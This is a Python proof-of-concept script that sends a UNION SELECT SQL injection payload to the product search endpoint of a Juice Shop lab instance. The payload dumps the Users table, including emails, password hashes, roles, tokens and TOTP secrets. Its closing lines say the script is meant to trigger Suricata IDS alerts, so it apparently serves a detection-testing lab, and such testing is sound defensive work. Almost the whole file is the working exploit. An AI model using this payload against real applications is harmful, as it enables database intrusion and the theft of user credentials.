#!/usr/bin/env python3
"""SQL Injection - UNION SELECT to dump user data from Juice Shop."""

import requests
import json
import sys
import urllib.parse

TARGET = "http://juice-shop:3000"

def main():
    print("[*] SQL Injection - UNION SELECT PoC")
    print(f"[*] Target: {TARGET}")
    print()

    # Juice Shop product search is vulnerable to SQLi
    # The search endpoint uses a query like: SELECT * FROM Products WHERE name LIKE '%<input>%'
    sqli_payload = "')) UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--"
    encoded = urllib.parse.quote(sqli_payload)

    url = f"{TARGET}/rest/products/search?q={encoded}"

    print(f"[*] SQLi Payload: {sqli_payload}")
    print(f"[*] Sending GET to product search endpoint...")
    print()

    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Status Code: {resp.status_code}")

        try:
            data = resp.json()
            if "data" in data and len(data["data"]) > 0:
                print(f"[+] SUCCESS! Retrieved {len(data['data'])} records")
                print()
                for i, item in enumerate(data["data"][:10]):
                    print(f"  [{i+1}] {json.dumps(item)}")
                if len(data["data"]) > 10:
                    print(f"  ... and {len(data['data']) - 10} more")
            else:
                print("[*] Query executed but returned empty results")
                print("[*] The UNION SELECT payload was still sent and should trigger Suricata alerts")
                print(f"[*] Response: {json.dumps(data)[:300]}")
        except json.JSONDecodeError:
            print(f"[*] Raw response: {resp.text[:500]}")

    except requests.ConnectionError:
        print("[-] ERROR: Could not connect to Juice Shop")
        sys.exit(1)
    except Exception as e:
        print(f"[-] ERROR: {e}")
        sys.exit(1)

    print()
    print("[*] Attack complete. Check Suricata alerts for SID 100001, 100002.")

if __name__ == "__main__":
    main()
